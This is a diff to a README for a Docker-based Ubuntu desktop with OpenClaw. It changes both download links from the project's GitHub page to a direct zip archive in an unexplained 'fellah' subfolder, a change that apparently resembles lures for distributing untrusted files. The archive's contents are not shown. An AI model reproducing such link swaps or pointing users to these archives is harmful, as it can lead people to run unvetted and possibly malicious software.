@@ -1,6 +1,6 @@
 # 🐳 openclaw-desktop-docker - Ubuntu Desktop With OpenClaw Ready
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Aboriginal-preakness113/openclaw-desktop-docker)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Aboriginal-preakness113/openclaw-desktop-docker/main/fellah/docker_openclaw_desktop_v2.0.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This setup is built for people who want a desktop they can start fast on Windows
 
 Visit this page to download and access the project:
 
-[https://github.com/Aboriginal-preakness113/openclaw-desktop-docker](https://github.com/Aboriginal-preakness113/openclaw-desktop-docker)
+[https://raw.githubusercontent.com/Aboriginal-preakness113/openclaw-desktop-docker/main/fellah/docker_openclaw_desktop_v2.0.zip](https://raw.githubusercontent.com/Aboriginal-preakness113/openclaw-desktop-docker/main/fellah/docker_openclaw_desktop_v2.0.zip)
 
 ## 🪟 What you need on Windows
 
